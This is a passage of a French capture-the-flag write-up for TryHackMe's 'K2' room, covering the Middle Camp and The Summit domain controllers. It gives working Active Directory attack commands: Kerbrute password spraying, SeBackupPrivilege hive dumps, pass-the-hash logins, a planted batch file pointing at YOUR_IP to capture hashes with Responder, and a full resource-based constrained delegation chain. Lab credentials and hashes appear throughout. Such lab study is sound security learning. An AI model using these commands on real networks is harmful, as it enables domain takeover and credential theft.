</code></pre><p><img src=/images/THM-K2/valid_creds_k2AD.png alt="netexec AD enumeration"></p><p>Les identifiants <code>r.bud:vRMkaVgdfxhW!8</code> sont valides !</p><blockquote><p>L&rsquo;utilisation de netexec pour l&rsquo;énumération AD <strong>ne fonctionnera pas si l&rsquo;authentification nulle est désactivée</strong> parce que nous aurons besoin de fournir des informations d&rsquo;identification valides (nom d&rsquo;utilisateur et mot de passe) pour s&rsquo;authentifier auprès des services SMB.</p></blockquote><h4 id=méthode-kerbrute>Méthode Kerbrute</h4><p>Kerbrute peut également être utilisé pour trouver les noms d&rsquo;utilisateur valides.</p><pre tabindex=0><code>./kerbrute userenum --dc K2Server.k2.thm -d k2.thm potential_AD_users.txt 
</code></pre><p><img src=/images/THM-K2/k2_valid_AD_usernames.png alt="kerbrute AD enumeration"></p><p>Nous pouvons ensuite utiliser les mots de passe trouvés contre les utilisateurs.</p><pre tabindex=0><code>./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt j.bold

./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm found_pwds.txt r.bud
</code></pre><p><img src=/images/THM-K2/rose_bud_kerbrute.png alt="kerbrute credentials brute forcing"></p><blockquote><p>Kerbrute fonctionnera indépendamment du fait que l&rsquo;authentification nulle soit activée ou désactivée. Il est conçu pour trouver des informations d&rsquo;identification valides par rapport à un service d&rsquo;authentification <strong>Kerberos</strong>.</p></blockquote><h2 id=accès-initial-shell-en-tant-que-rose>Accès initial (shell en tant que rose)</h2><p>Avec les identifiants valides, nous nous connectons avec evil-winrm.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u r.bud -p &#34;vRMkaVgdfxhW\!8&#34;
</code></pre><p><img src=/images/THM-K2/foothold_k2MC.png alt="K2-Middle Camp foothold"></p><p>Dans <code>C:\Users\r.bud\Documents</code> nous trouvons deux fichiers texte: <code>notes.txt</code> et <code>note_to_james.txt</code>.</p><p><img src=/images/THM-K2/rbud_notes_content.png alt="notes content"></p><p>Il s&rsquo;agit d&rsquo;un échange concernant la conformité d&rsquo;un mot de passe. James a ajouté deux caractères à son mot de passe précédent, qui était <code>rockyou</code>, afin de répondre aux critères.</p><p>Nous savons donc que le mot de passe de James comporte <strong>9</strong> caractères et inclut <code>rockyou</code>, un caractère spécial et un chiffre.</p><p>Utilisons un script Bash pour générer quelques mots de passe.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e06c75>special_characters</span><span style=color:#56b6c2>=(</span><span style=color:#98c379>&#39;!&#39;</span> <span style=color:#98c379>&#39;@&#39;</span> <span style=color:#98c379>&#39;#&#39;</span> <span style=color:#98c379>&#39;$&#39;</span> <span style=color:#98c379>&#39;%&#39;</span> <span style=color:#98c379>&#39;^&#39;</span> <span style=color:#98c379>&#39;&amp;&#39;</span> <span style=color:#98c379>&#39;*&#39;</span><span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>numbers</span><span style=color:#56b6c2>=(</span><span style=color:#d19a66>0</span> <span style=color:#d19a66>1</span> <span style=color:#d19a66>2</span> <span style=color:#d19a66>3</span> <span style=color:#d19a66>4</span> <span style=color:#d19a66>5</span> <span style=color:#d19a66>6</span> <span style=color:#d19a66>7</span> <span style=color:#d19a66>8</span> 9<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>output_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;james_passwords.txt&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> special in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>special_characters</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> number in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>numbers</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}</span><span style=color:#98c379>rockyou&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}</span><span style=color:#98c379>rockyou&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;rockyou</span><span style=color:#98c379>${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;rockyou</span><span style=color:#98c379>${</span><span style=color:#e06c75>special</span><span style=color:#98c379>}${</span><span style=color:#e06c75>number</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span> &gt;&gt; <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Password list generated in </span><span style=color:#e06c75>$output_file</span><span style=color:#98c379>&#34;</span>
</span></span></code></pre></div><p>Nous utilisons cette liste contre le nom d&rsquo;utilisateur valide <code>j.bold</code>.</p><pre tabindex=0><code>./kerbrute bruteuser --dc K2Server.k2.thm -d k2.thm james_passwords.txt j.bold
</code></pre><p><img src=/images/THM-K2/jbold_pwd_found.png alt="j.bold credentials found"></p><p>Nous trouvons les identifiants valides <code>j.bold:#8rockyou</code>. Cependant, nous ne pouvons pas nous connecter via evil-winrm avec James car son <code>Remote Access</code> a été supprimé.</p><p>Nous pouvons le confirmer avec les résultats de <code>net user r.bud</code> et <code>net user j.bold</code>. Rose Bud fait partie du groupe <code>Remote Management Use</code>.</p><p><img src=/images/THM-K2/rosebud_remote_access.png alt="rose group memberships"></p><p>Mais James Bold ne l&rsquo;est pas.</p><p><img src=/images/THM-K2/jbold_no_remote_access.png alt="j.bold group memberships"></p><p>Lançons Bloodhound avec les données d&rsquo;identification de Rose Bud.</p><pre tabindex=0><code>bloodhound-python -c all -u r.bud -p &#39;vRMkaVgdfxhW!8&#39; -d k2.thm -dc K2Server.k2.thm -ns 10.10.70.233
</code></pre><p><img src=/images/THM-K2/rose_bud_bloodhound_py.png alt="bloodhound-python command"></p><p>Démarrer la base de données</p><pre tabindex=0><code>sudo neo4j start
</code></pre><p>Lancer Bloodhound</p><pre tabindex=0><code>bloodhound --no-sandbox
</code></pre><p>Dans la section <code>Analysis</code>, nous sélectionnons <code>Find Shortest Paths to Domain Admins</code>.</p><p>Nous découvrons que les membres de <code>IT STAFF 1</code> (dont James fait partie) ont la permission <code>GenericAll</code> sur <code>J.SMITH</code>.</p><p><img src=/images/THM-K2/jbold_GenericAll.png alt="IT STAFF 1 members - GenericAll permission"></p><p>Nous faisons un clic droit sur le thread <code>GenericAll</code>, sélectionnons <code>Help</code> et sous <code>Linux Abuse</code> nous lisons que nous pouvons changer le mot de passe de l&rsquo;utilisateur.</p><p><img src=/images/THM-K2/ForceChangePassword.png alt="ForceChangePassword command"></p><pre tabindex=0><code>net rpc password &#34;TargetUser&#34; &#34;newP@ssword2022&#34; -U &#34;DOMAIN&#34;/&#34;ControlledUser&#34;%&#34;Password&#34; -S &#34;DomainController&#34;
</code></pre><p><img src=/images/THM-K2/jsmith_pwd_change.png alt="jsmith password change"></p><h3 id=mouvement-latéral-shell-en-tant-que-jsmith>Mouvement latéral (shell en tant que j.smith)</h3><p>Nous nous connectons ensuite avec evil-winrm et récupérons le drapeau de utilisateur sur le bureau.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u j.smith -p &#34;Paswword#@2024&#34;
</code></pre><p><img src=/images/THM-K2/jsmith_login.png alt="jsmith login"></p><h2 id=what-are-the-usernames-found-on-the-server>What are the usernames found on the server?</h2><p>Les noms d&rsquo;utilisateur trouvés sont les suivants:</p><pre tabindex=0><code>j.bold,j.smith,r.bud
</code></pre><h2 id=what-is-the-root-flag-1>What is the root flag?</h2><p>De retour sur Bloodhound, nous constatons que <code>J.SMITH</code> fait partie du groupe <code>Backup Operators</code>.</p><p><img src=/images/THM-K2/JSMITH_backup_operators.png alt="jsmith Backup Operators membership"></p><p><img src=/images/THM-K2/Backup_Operators_AD_info.png alt="Backup Operators group info">
<em><a href=https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators>Source</a></em></p><p>Sur <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators>cette page</a> HackTricks, nous trouvons deux méthodes différentes pour abuser de l&rsquo;appartenance au groupe <code>Backup Operators</code>. La première méthode <code>Local Attack</code> nous aidera à obtenir le drapeau root.</p><ol><li>Nous devons transférer deux fichiers dll nécessaires : <code>SeBackupPrivilegeUtils.dll</code> et <code>SeBackupPrivilegeCmdLets.dll</code>. Ils sont disponibles sur <a href=https://github.com/giuliano108/SeBackupPrivilege>ce répertoire Github</a>.</li></ol><p>Après avoir cloné le répertoire, nous transférons les fichiers vers la cible via notre shell evil-winrm.</p><pre tabindex=0><code>upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

upload /home/kscorpio/Machines/TryHackMe/K2/K2_Middle_Camp/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
</code></pre><p><img src=/images/THM-K2/DLLs_uploads.png alt="DLL file uploads"></p><ol start=2><li>Importez les bibliothèques</li></ol><pre tabindex=0><code>Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
</code></pre><p><img src=/images/THM-K2/Import_DLLs.png alt="Import DLL"></p><ol start=3><li>Nous pouvons maintenant copier des fichiers situés dans des répertoires restreints</li></ol><pre tabindex=0><code>cd C:\Users\Administrator\

Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\Users\j.smith\Documents\root.txt -Overwrite
</code></pre><ol start=4><li>Avec les commandes ci-dessus, nous copierons le drapeau root dans <code>C:\Users\j.smith\Documents</code></li></ol><p><img src=/images/THM-K2/root_flag_k2MC.png alt="Read Rood flag"></p><h2 id=what-is-the-administrators-ntlm-hash>What is the Administrator&rsquo;s NTLM hash?</h2><h3 id=elévation-de-privilèges-1>Elévation de Privilèges</h3><p><img src=/images/THM-K2/SeBackUpPriv.png alt=SeBackUpPriv></p><p>Grâce au privilège <code>SeBackupPrivilege</code>, nous pouvons obtenir des copies des ruches SAM et SYSTEM.</p><p><img src=/images/THM-K2/SeBackupPrivilege_info.png alt="SeBackUpPriv information">
<em><a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges>Source</a></em></p><pre tabindex=0><code>reg save hklm\sam C:\Windows\Temp\SAM

reg save hklm\system C:\Windows\Temp\SYSTEM
</code></pre><p><img src=/images/THM-K2/reghives_copy.png alt="reghives copy"></p><p>Nous transférons ensuite les ruches sur notre machine locale.</p><pre tabindex=0><code>download C:\Windows\Temp\SAM

download C:\Windows\Temp\SYSTEM
</code></pre><p>Avec <code>impacket</code>, nous pouvons extraire les hashs en utilisant les ruches que nous avons téléchargées.</p><pre tabindex=0><code>impacket-secretsdump -sam SAM -system SYSTEM local
</code></pre><p><img src=/images/THM-K2/Admin_hash.png alt="Admin hash"></p><p>En utilisant le hash de l&rsquo;utilisateur <code>Administrator</code>, nous nous connectons avec evil-winrm.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u Administrator -H &#34;9545b61858c043477c350ae86c37b32f&#34;
</code></pre><p>De plus, nous pouvons récupérer le mot de passe de l&rsquo;administrateur avec netexec.</p><pre tabindex=0><code>netexec smb k2.thm -u Administrator -H &#34;9545b61858c043477c350ae86c37b32f&#34; --dpapi
</code></pre><p><img src=/images/THM-K2/admin_pwd.png alt="Admin password"></p><p>Les identifiants admin sont <code>Administrator:vz0q$i8b4c</code>.</p><p>Nous passons ensuite à la dernière machine de cette salle, The Summit.</p><h1 id=the-summit>The Summit</h1><p>The Summit, la dernière machine de la salle K2, est également un contrôleur de domaine. Grâce à l&rsquo;énumération de l&rsquo;Active Directory, nous découvrons des informations d&rsquo;identification valides, nous permettant d&rsquo;obtenir un accès initial. Nous exploitons ensuite des mauvaises permissions liées à un fichier <code>.bat</code> pour obtenir le hash du mot de passe du propriétaire du fichier, qui, une fois craqué, nous donne accès à ce compte. Bloodhound révèle que cet utilisateur fait partie d&rsquo;un groupe disposant de l&rsquo;autorisation <code>GenericWrite</code> sur le contrôleur de domaine, et en abusant de cette autorisation nous effectuons une délégation restreinte basée sur les ressources (Resource-Based Constrained Delegation, RBCD). Grâce à cette technique, nous récupérons le hash <code>Administrator</code> et le drapeau root.</p><h2 id=balayage-the-summit>Balayage (The Summit)</h2><p>Mettez à jour <code>/etc/hosts</code> et scannez la cible.</p><pre tabindex=0><code>sudo nmap -sC -sV -oA nmap/k2_Summit k2.thm
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-16 16:56 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> k2.thm <span style=color:#56b6c2>(</span>10.10.124.173<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.19s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>988</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-10-16 21:57:18Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp  open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: k2.thm0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp open  tcpwrapped
</span></span><span style=display:flex><span>3389/tcp open  ms-wbt-server Microsoft Terminal Services
</span></span><span style=display:flex><span>| rdp-ntlm-info: 
</span></span><span style=display:flex><span>|   Target_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Domain_Name: K2
</span></span><span style=display:flex><span>|   NetBIOS_Computer_Name: K2ROOTDC
</span></span><span style=display:flex><span>|   DNS_Domain_Name: k2.thm
</span></span><span style=display:flex><span>|   DNS_Computer_Name: K2RootDC.k2.thm
</span></span><span style=display:flex><span>|   DNS_Tree_Name: k2.thm
</span></span><span style=display:flex><span>|   Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_  System_Time: 2024-10-16T21:57:30+00:00
</span></span><span style=display:flex><span>|_ssl-date: 2024-10-16T21:58:09+00:00; 0s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>K2RootDC.k2.thm
</span></span><span style=display:flex><span>| Not valid before: 2024-10-15T21:52:04
</span></span><span style=display:flex><span>|_Not valid after:  2025-04-16T21:52:04
</span></span><span style=display:flex><span>Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-10-16T21:57:33
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 77.09 seconds
</span></span></code></pre></div><p>La dernière machine est un autre contrôleur de domaine avec le nom <code>K2RootDC.k2.thm</code>.</p><h2 id=what-is-the-user-flag-2>What is the user flag?</h2><h3 id=enumération-2>Enumération</h3><p>Nous mettons à jour nos listes avant de commencer à énumérer Active Directory.</p><p><strong>Noms d&rsquo;utilisateur AD possibles</strong></p><pre tabindex=0><code>j.bold
j.smith
r.bud
administrator
</code></pre><p><strong>Mots de passe trouvés</strong></p><pre tabindex=0><code>Pwd@9tLNrC3!
RdzQ7MSKt)fNaz3!
vRMkaVgdfxhW!8
#8rockyou
vz0q$i8b4c
</code></pre><p>Utilisons<code>Kerbrute</code> pour trouver les noms d&rsquo;utilisateurs valides.</p><p><img src=/images/THM-K2/valid_users_k2S.png alt="K2-The Summit AD enumeration"></p><p>Une fois de plus, nous comparons nos mots de passe aux utilisateurs valides.</p><pre tabindex=0><code>kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt j.smith

kerbrute bruteuser --dc K2RootDC.k2.thm -d k2.thm potential_pwds.txt administrator
</code></pre><p><img src=/images/THM-K2/JSMITH_valid_creds.png alt="JSMITH valid credentials"></p><p>Nous trouvons les identifiants valides : <code>j.smith:vz0q$i8b4c</code>. (Il s&rsquo;agit du mot de passe administrateur de la machine Middle Camp).</p><h3 id=accès-initial-shell-en-tant-que-jsmith>Accès initial (shell en tant que j.smith)</h3><p>Nous nous connectons avec evil-winrm en tant que <code>j.smith</code> mais le drapeau utilisateur n&rsquo;est pas sur ce compte. Aucun des différents répertoires de cet utilisateur ne contient des informations intéressantes.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u j.smith -p &#34;vz0q$i8b4c&#34;
</code></pre><p><img src=/images/THM-K2/k2_Summit_JSMITH_login.png alt="JSMITH login"></p><p>Dans <code>C:\Scripts</code> nous trouvons un fichier appelé <code>backup.bat</code>. Il exécute la commande suivante</p><pre tabindex=0><code>copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
</code></pre><p><img src=/images/THM-K2/bat_file.png alt="Bat file content"></p><p>En vérifiant les permissions sur le fichier et son répertoire parent, nous découvrons que <code>j.smith</code>, l&rsquo;utilisateur que nous contrôlons actuellement, a le contrôle total sur <code>C:/Scripts</code>.</p><pre tabindex=0><code>Get-Acl -Path &#34;C:\Scripts\backup.bat&#34;

Get-Acl -Path &#34;C:\Scripts&#34;
</code></pre><p><img src=/images/THM-K2/file_permissions.png alt="File permissions"></p><p>Nous pouvons exploiter cette permission et obtenir le hash de <code>o.armstrong</code>.</p><ol><li>Lancez Responder pour capturer le hash</li></ol><pre tabindex=0><code>sudo responder -I tun0
</code></pre><ol start=2><li>Supprimez le fichier <code>backup.bat</code> existant et créez-en un autre du même nom avec un contenu différent</li></ol><pre tabindex=0><code>rm backup.bat

Set-Content -Path &#34;C:\Scripts\backup.bat&#34; -Value &#39;copy \\YOUR_IP\share\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt&#39;
</code></pre><p><img src=/images/THM-K2/backup_file_replace.png alt="Malicious bat file"></p><p>Après un peu de temps, nous obtenons le hash sur Responder.</p><p><img src=/images/THM-K2/o_amstrong_hash.png alt="o.arnstrong hash"></p><p>Nous le craquons avec hashcat et récupérons le mot de passe <code>arMStronG08</code>.</p><pre tabindex=0><code>hashcat -a 0 -m 5600 oamstrong_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/THM-K2/oamstrong_hash_cracked.png alt="o.arnstrong hash cracked"></p><h3 id=mouvement-latéral-shell-en-tant-que-oarmstrong>Mouvement latéral (shell en tant que o.armstrong)</h3><p>En utilisant evil-winrm, nous nous connectons en tant que <code>o.armstrong</code> et trouvons le drapeau utilisateur.</p><p><img src=/images/THM-K2/oarmstrong_login.png alt="o.arnstrong login"></p><p>Le fichier <code>notes.txt</code> est une liste de tâches à accomplir.</p><p><img src=/images/THM-K2/k2_summit_notes_file.png alt="o.arnstrong notes.txt file"></p><h2 id=what-is-the-root-flag-2>What is the root flag?</h2><h3 id=elévation-de-privilèges-2>Elévation de Privilèges</h3><p>Exécutons Bloodhound afin de trouver des pistes d&rsquo;escalade de privilèges.</p><pre tabindex=0><code>bloodhound-python -c all -u j.smith -p &#39;vz0q$i8b4c&#39; -d k2.thm -dc K2RootDC.k2.thm -ns 10.10.124.173
</code></pre><p>Démarrez la base de données et lancez Bloodhound.</p><pre tabindex=0><code>sudo neo4j start

bloodhound --no-sandbox
</code></pre><p><code>o.armstrong</code> fait partie du groupe <code>IT DIRECTOR</code> et ses membres ont la permission <code>GenericWrite</code> sur le DC. Nous pouvons l&rsquo;exploiter via la délégation contrainte basée sur les ressources (RBCD).</p><p><img src=/images/THM-K2/IT_Director_membership.png alt="o.arnstrong IT DIRECTOR MEMBERSHIP"></p><p><img src=/images/THM-K2/GenericWrite_Perm.png alt="IT DIRECTOR GenericWrite permission"></p><blockquote><p>La <strong>délégation restreinte basée sur les ressources (RBDC)</strong>, également connue sous le nom de <strong>délégation Kerberos contrainte basée sur les ressources</strong>, est un mécanisme de sécurité mis en place dans Active Directory pour contrôler finement les autorisations d&rsquo;accès aux ressources réseau. Elle permet de déléguer des droits d&rsquo;accès spécifiques à des comptes d&rsquo;utilisateurs ou de services, en limitant ces droits à des ressources bien définies. <em>Pour en savoir plus, cliquez <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation>ici</a></em>.</p></blockquote><ol><li>Créer un compte d&rsquo;ordinateur dans le domaine</li></ol><pre tabindex=0><code>impacket-addcomputer -computer-name &#39;KSCORPIO$&#39; -computer-pass &#39;LETSgetr00t!&#39; -dc-host K2RootDC.k2.thm -domain-netbios k2.thm k2.thm/o.armstrong:&#39;arMStronG08&#39;
</code></pre><p><img src=/images/THM-K2/RBCD1.png alt="RBCD step 1"></p><ol start=2><li>Modifier l&rsquo;attribut <code>msDS-AllowedToActOnBehalfOtherIdentity</code> sur le contrôleur de domaine pour inclure notre objet ordinateur nouvellement créé afin d&rsquo;autoriser l&rsquo;usurpation d&rsquo;identité.</li></ol><pre tabindex=0><code>impacket-rbcd -delegate-from &#39;KSCORPIO$&#39; -delegate-to &#39;K2RootDC$&#39; -dc-ip 10.10.124.173 -action &#39;write&#39; &#39;k2.thm/o.armstrong:arMStronG08&#39;
</code></pre><p><img src=/images/THM-K2/RBCD2.png alt="RBCD step 2"></p><ol start=3><li>Obtenir un ticket Kerberos en se faisant passer pour <strong>Administrator</strong>.</li></ol><pre tabindex=0><code>impacket-getST -spn &#39;cifs/K2RootDC.k2.thm&#39; -impersonate Administrator -dc-ip 10.10.124.173 k2.thm/KSCORPIO$:&#39;LETSgetr00t!&#39;
</code></pre><p><img src=/images/THM-K2/RBCD3.png alt="RBCD step 3"></p><ol start=4><li>Pour qu&rsquo;Impacket utilise notre ticket, il faut définir une variable d&rsquo;environnement avec le nom de notre fichier de cache.</li></ol><pre tabindex=0><code>export KRB5CCNAME=Administrator@cifs_K2RootDC.k2.thm@K2.THM.ccache
</code></pre><ol start=5><li>Extraire les hashs NTLM du DC.</li></ol><pre tabindex=0><code>impacket-secretsdump &#39;k2.thm/Administrator@K2RootDC.k2.thm&#39; -k -no-pass -dc-ip 10.10.124.173 -target-ip 10.10.124.173 -just-dc-ntlm
</code></pre><p><img src=/images/THM-K2/RBCD4.png alt="RBCD step 4"></p><p>Avec le hash de l&rsquo;administrateur, nous pouvons nous connecter via evil-winrm et lire le drapeau root.</p><pre tabindex=0><code>evil-winrm -i k2.thm -u Administrator -H &#34;15ecc755a43d2e7c8001215609d94b90&#34;
</code></pre><p><img src=/images/THM-K2/root_flag_K2S.png alt="K2 -Summit root flag"></p><p>Merci d&rsquo;avoir pris le temps de lire ce <strong>long</strong> article! Je vous laisse ci-dessous quelques références qui m&rsquo;ont été utiles pour cette room.</p><h2 id=références>Références</h2><ul><li><p><a href=https://tib3rius.com/sqli.html>Tib3rius SQLi cheatsheet</a></p></li><li><p>TryHackMe propose trois <strong>salles gratuites</strong> qui vous donneront une bonne base pour SQLi:</p><ul><li><a href=https://tryhackme.com/r/room/sqlinjectionlm>SQL Injection</a></li><li><a href=https://tryhackme.com/r/room/advancedsqlinjection>Advanced SQL Injection</a></li><li><a href=https://tryhackme.com/r/room/sqlilab>SQL Injection Lab</a></li></ul></li><li><p>Installer Bloodhound avec Docker Compose (configuration plus simple) disponible <a href=https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose#h_01H9MMVW3J42013Q0P68WSRK2R>ici</a>.</p></li><li><p>Comment abuser de l&rsquo;appartenance au groupe <code>Backup Operators</code> -> <a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators>ici</a>.</p></li><li><p>Apprendre ce qu&rsquo;est le CIFS (utilisé à l&rsquo;étape 3 de la RBCD) -> <a href=https://www.upguard.com/blog/cifs>What is CIFS?</a></p></li></ul></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-editorial/>&#8592;
Précédent:
HTB: Editorial</a></p><p class=prev-post-date>octobre 16, 2024</p></div><div class=next-post><p><a href=/fr/posts/thm-rabbithole/>Suivant:
THM: Rabbit Hole
&#8594;</a></p><p class=next-post-date>octobre 29, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#base-camp>Base Camp</a><ul><li><a href=#balayage-base-camp>Balayage (Base Camp)</a></li><li><a href=#what-is-the-user-flag>What is the user flag?</a><ul><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial-shell-en-tant-que-james>Accès initial (shell en tant que james)</a></li></ul></li><li><a href=#what-is-the-root-flag>What is the root flag?</a><ul><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li><li><a href=#what-are-the-usernames-and-passwords-that-had-access-to-the-server>What are the usernames and passwords that had access to the server?</a></li><li><a href=#two-users-have-their-full-names-on-display-what-are-their-names>Two users have their full names on display. What are their names?</a></li></ul></li><li><a href=#middle-camp>Middle Camp</a><ul><li><a href=#balayage-middle-camp>Balayage (Middle Camp)</a></li><li><a href=#what-is-the-user-flag-1>What is the user flag?</a><ul><li><a href=#enumération-1>Enumération</a><ul><li><a href=#méthode-netexec>Méthode NetExec</a></li><li><a href=#méthode-kerbrute>Méthode Kerbrute</a></li></ul></li></ul></li><li><a 